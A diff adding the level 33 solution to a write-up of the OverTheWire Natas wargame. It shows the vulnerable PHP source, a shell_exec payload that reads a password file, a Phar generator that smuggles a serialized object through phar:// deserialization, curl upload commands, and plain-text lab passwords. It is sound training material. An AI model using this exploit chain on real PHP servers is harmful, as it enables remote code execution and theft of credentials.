@@ -4024,6 +4024,158 @@ Don't let **user input control file input sources**, as it can lead to unintende
 - **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas33.natas.labs.overthewire.org`
 - **Password**: `2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`
+- **Tools**: Web Browser, `curl`, `PHP`, `Phar`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<h1>natas33</h1>
+<div id="content">
+    <h2>Can you get it right?</h2>
+
+                <form enctype="multipart/form-data" action="index.php" method="POST">
+        <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
+        <input type="hidden" name="filename" value="140fcgrq4fshv8tuu4mmpjf3fq" />
+        Upload Firmware Update:<br/>
+        <input name="uploadedfile" type="file" /><br />
+        <input type="submit" value="Upload File" />
+    </form>
+
+    <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's view the source code!
+```php
+<?php
+    // graz XeR, the first to solve it! thanks for the feedback!
+    // ~morla
+    class Executor{
+        private $filename="";
+        private $signature='adeafbadbabec0dedabada55ba55d00d';
+        private $init=False;
+
+        function __construct(){
+            $this->filename=$_POST["filename"];
+            if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
+                echo "File is too big<br>";
+            }
+            else {
+                if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
+                    echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
+                    echo "Firmware upgrad initialised.<br>";
+                }
+                else{
+                    echo "There was an error uploading the file, please try again!<br>";
+                }
+            }
+        }
+
+        function __destruct(){
+            // upgrade firmware at the end of this script
+
+            // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
+            chdir("/natas33/upload/");
+            if(md5_file($this->filename) == $this->signature){
+                echo "Congratulations! Running firmware update: $this->filename <br>";
+                passthru("php " . $this->filename);
+            }
+            else{
+                echo "Failur! MD5sum mismatch!<br>";
+            }
+        }
+    }
+?>
+```
+
+Notice that `__destruct()` executes the filename with `passthru()` if the `MD5` hash matches the expected signature.
+
+`md5_file()` computes the `MD5` hash of the supplied file path.
+
+However, PHP filesystem functions support stream wrappers such as `phar://`.
+
+This means `md5_file()` is not limited to normal files.
+
+If we supply a `phar://` path, PHP accesses the `Phar` archive instead.
+
+When a `Phar` archive is accessed, `PHP` automatically unserializes its metadata.
+
+This lets us inject a serialized `Executor` object, even though the application never explicitly calls `unserialize()`.
+
+The object is not executed immediately. Instead, PHP automatically calls `__destruct()` when the script finishes running.
+
+Let's make a malicious `PHP` script:
+[level-33/pass.php](level-33/pass.php):
+```php
+<?php echo shell_exec('cat /etc/natas_webpass/natas34');
+```
+
+Next, create a Phar archive with a serialized `Executor` object as metadata, and set its filename property to `pass.php`:
+[level-33/gen-phar.php](level-33/gen-phar.php):
+```php
+<?php
+class Executor
+{
+  private $filename = "pass.php";
+  private $signature = True;
+  private $init = False;
+}
+
+$phar = new Phar("pass.phar");
+$phar->startBuffering();
+$phar->addFromString("pass.txt", 'test');
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$o = new Executor();
+$phar->setMetadata($o);
+$phar->stopBuffering();
+```
+
+The `signature` is set to `True` to exploit PHP’s loose comparison, where a non-matching MD5 hash can still evaluate as true in certain type-juggling conditions.
+
+Run `php -d phar.readonly=false gen-phar.php` to generate `pass.phar`.
+
+Upload `pass.php` to the server:
+```powershell
+curl.exe -u "natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" `
+  -F "uploadedfile=@pass.php" `
+  -F "filename=pass.php" `
+  "http://natas33.natas.labs.overthewire.org"
+```
+
+Upload `pass.phar` to the server:
+```powershell
+curl.exe -u "natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" `
+  -F "uploadedfile=@pass.phar" `
+  -F "filename=pass.phar" `
+  "http://natas33.natas.labs.overthewire.org"
+```
+
+Trigger the `Phar` deserialization by uploading `pass.phar` with the filename set to `phar://pass.phar`:
+```powershell
+curl.exe -u "natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" `
+  -F "uploadedfile=@pass.phar" `
+  -F "filename=phar://pass.phar" `
+  "http://natas33.natas.labs.overthewire.org"
+```
+
+Output:
+```html
+Congratulations! Running firmware update: pass.php <br>j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
+```
+
+And the password for natas34 is `j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`.
+
+#### The Lesson
+
+Don't let user input control file paths used by filesystem functions, as **stream wrappers can lead to deserialization** and code execution.
+
+### Level 34
+
+- **Date**: 2026-04-30 (solved, not documented)
+- **URL**: `http://natas34.natas.labs.overthewire.org`
+- **Password**: `j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`
 - **Tools**: Web Browser
 
 #### The Solution
@@ -4031,3 +4183,23 @@ Don't let **user input control file input sources**, as it can lead to unintende
 Use CTRL + U to view the page source. And notice:
 
 ```html
+<h1>natas34</h1>
+<div id="content">
+Congratulations! You have reached the end... for now.
+</div>
+```
+
+**Finally done!** :D
+
+## Extra sources
+
+- [ChatGPT](https://chat.openai.com/) for most levels.
+- [Gemini](https://gemini.google.com/) only for level **25**.
+- [Over the wire natas Walkthrough-Level-27 (Hacker4Help)](https://www.youtube.com/watch?v=NuYbU-drS48) by **Hacker4Help** for level **27**.
+- [https://learnhacking.io/overthewire-natas-level-28-walkthrough/](https://learnhacking.io/overthewire-natas-level-28-walkthrough/) by **Learn Hacking** for level **28**.
+- [https://learnhacking.io/overthewire-natas-level-29-walkthrough/](https://learnhacking.io/overthewire-natas-level-29-walkthrough/) by **Learn Hacking** for level **29**.
+- [https://learnhacking.io/overthewire-natas-level-30-walkthrough/](https://learnhacking.io/overthewire-natas-level-30-walkthrough/) by **Learn Hacking** for level **30**.
+- [https://learnhacking.io/overthewire-natas-level-31-walkthrough/](https://learnhacking.io/overthewire-natas-level-31-walkthrough/) by **Learn Hacking** for level **31**.
+- [https://learnhacking.io/overthewire-natas-level-32-walkthrough/](https://learnhacking.io/overthewire-natas-level-32-walkthrough/) by **Learn Hacking** for level **32**.
+- [https://learnhacking.io/overthewire-natas-level-33-walkthrough/](https://learnhacking.io/overthewire-natas-level-33-walkthrough/) by **Learn Hacking** for level **33**.
+- [https://miaxu-src.github.io/natas/2021/09/25/natas33-walkthrough.html](https://miaxu-src.github.io/natas/2021/09/25/natas33-walkthrough.html) by **Miaxu** for level **33**.
